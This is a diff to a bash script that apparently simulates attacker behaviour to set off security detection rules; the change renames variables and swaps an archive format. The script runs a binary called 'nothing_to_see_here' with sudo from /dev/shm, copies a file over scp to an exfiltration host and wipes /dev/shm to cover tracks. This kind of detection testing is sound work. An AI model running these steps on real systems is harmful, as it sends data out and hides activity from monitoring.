@@ -16,16 +16,17 @@ trap err_report ERR
 
 # Load shared variables from config.sh
 # This expects the config.sh file to be in the same directory as this script
-# ****************************************************
-# *** MAKE VARIABLE CHANGES IN config.sh, NOT HERE ***
-# ****************************************************
+# ***************************************************
+# !!!  DO NOT MAKE VARIABLE CHANGES HERE   !!!      *
+# !!!  MAKE VARIABLE CHANGES IN config.sh  !!!      *
+# ***************************************************
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 source "$SCRIPT_DIR/config.sh"
 
 # List of required variables
 required_vars=(
-  ROOTDIR
-  HOMEDIR
+  TARGET_HOST_ROOTDIR
+  EXFILL_SSH_KEY
   EXFILL_TARGET
   FILE
 )
@@ -62,7 +63,7 @@ done
 
 # Copy C programs over and execute
 /bin/echo "Copying binaries over and executing"
-/usr/bin/cp -p $ROOTDIR/files/demo_progs.tar /dev/shm/ &>/dev/null
+/usr/bin/cp -p $TARGET_HOST_ROOTDIR/files/demo_progs.tar /dev/shm/ &>/dev/null
 /usr/bin/tar xf /dev/shm/demo_progs.tar -C /dev/shm/ &>/dev/null
 sudo /dev/shm/nothing_to_see_here &>/dev/null
 
@@ -72,7 +73,7 @@ sudo /dev/shm/nothing_to_see_here &>/dev/null
 
 # Trigger Malware alert with EICAR file
 /bin/echo "Triggering Malware alert with EICAR file"
-/usr/bin/unzip $ROOTDIR/files/eicar_com.zip &>/dev/null
+/usr/bin/tar xf $TARGET_HOST_ROOTDIR/files/eicar_com.tar.gz &>/dev/null
 
 # Trigger Linux system info discovery rule
 /bin/echo "Triggering Linux system info discovery rule"
@@ -88,7 +89,7 @@ done
 
 if [ -f "$FILE" ]; then
   /bin/echo "Copying $FILE to $EXFILL_TARGET"
-  /usr/bin/scp -i $HOMEDIR/.ssh/id_rsa $FILE $SSH_USER@$EXFILL_TARGET:~/  
+  /usr/bin/scp -i $EXFILL_SSH_KEY $FILE $EXFILL_SSH_USER@$EXFILL_TARGET:~/  
 fi
 
 # Remove all files from /dev/shm to cover tracks.
